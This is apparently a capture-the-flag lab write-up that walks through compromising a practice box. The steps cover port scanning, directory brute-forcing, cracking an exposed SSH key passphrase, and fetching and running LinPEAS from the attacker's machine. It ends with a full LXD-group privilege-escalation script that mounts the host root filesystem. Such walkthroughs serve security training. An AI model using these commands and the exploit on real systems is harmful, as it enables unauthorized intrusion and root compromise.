## Target IP: 10.10.76.242

---

### Environment Variables

```bash
export IP=10.10.76.242
export LIP=10.6.24.56
```

---

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 -O $IP -oN nmap_results.txt
```

**Open Ports:**

| Port | Service | Version |
| --- | --- | --- |
| 22 | SSH | OpenSSH 7.6p1 |
| 80 | HTTP | Apache 2.4.29 |

---

### Web Enumeration

Visited: `http://$IP`

→ Fantasy-themed website for "draagan"

---

### Directory Brute Force

```bash
ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/dirb/common.txt -c --recursion
```

**Discovered:**

- `/robots.txt`
- `/secret`
- `/uploads`

---

### Pages and Contents

- `/robots.txt` → Mentions that uploads are allowed
- `/secret` → Contains an RSA key file
- `/uploads` → Shows 3 files:
    - `dict.lst` (password list)
    - `manifesto.txt`
    - `meme.jpg`

Downloaded everything:

```bash
wget -r -np -nH --cut-dirs=1 http://$IP/uploads
```

Checked:

- `meme.jpg` with `strings` and `binwalk` → nothing useful
- `manifesto.txt` → looks like junk
- `dict.lst` → password list with entries like:

```
...
spring2015
spring2014
spring2013
Summer2017
Summer2016
...
```

---

### Username Discovery

Found in site source code:

```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

→ Tried SSH with `john`

---

### SSH Key Crack and Login

Key was in `/secret`, so:

```bash
chmod 600 secretKey
ssh -i secretKey john@$IP
# → asked for passphrase
```

Prepared for cracking:

```bash
ssh2john secretKey > rsa_hash.txt
john rsa_hash.txt --wordlist=dict.lst
```

**Password found:**

```
[REDACTED]
```

SSH again:

```bash
ssh -i secretKey john@$IP
# Enter passphrase: [REDACTED]
```

→ Logged in as `john@exploitable`

---

### User Flag

Found in home directory:

```bash
cat user.txt
# → [REDACTED]
```

---

### Privilege Escalation Attempt

`sudo -l` fails because we don’t know john’s password.

---

### LinPEAS

On attacker machine:

```bash
cp /opt/linpeas/linpeas.sh .
python3 -m http.server 80
```

On victim machine:

```bash
wget http://10.6.24.56:80/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Returned:

- `AdminIdentities=unix-group:sudo;unix-group:admin`
- User is in group: `john adm cdrom sudo dip plugdev lxd`

---

### LXD Privilege Escalation

Followed this guide from Exploit-DB:

https://www.exploit-db.com/exploits/46978

**Steps:**

---

### On Attacker Machine:

```bash
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
bash build-alpine
# (must be run as root)
```

---

### On Victim Machine:

Saved the following exploit as a bash script:

```bash
function helpPanel(){
  echo -e "\nUsage:"
  echo -e "\t[-f] Filename (.tar.gz alpine file)"
  echo -e "\t[-h] Show this help panel\n"
  exit 1
}

function createContainer(){
  lxc image import $filename --alias alpine && lxd init --auto
  echo -e "[*] Listing images...\n" && lxc image list
  lxc init alpine privesc -c security.privileged=true
  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc sh
  cleanup
}

function cleanup(){
  echo -en "\n[*] Removing container..."
  lxc stop privesc && lxc delete privesc && lxc image delete alpine
  echo " [√]"
}

set -o nounset
set -o errexit

declare -i parameter_enable=0; while getopts ":f:h:" arg; do
  case $arg in
    f) filename=$OPTARG && let parameter_enable+=1;;
    h) helpPanel;;
  esac
done

if [ $parameter_enable -ne 1 ]; then
  helpPanel
else
  createContainer
fi
```

Ran it with:

```bash
bash exploit.sh -f alpine.tar.gz
```

Got a shell inside a privileged LXD container.

From there, accessed the host's root filesystem at:

```bash
cd /mnt/root
```

---

### Root Flag

```bash
find / -name "root.txt"
cat /mnt/root/root/root.txt
# → [REDACTED]
```
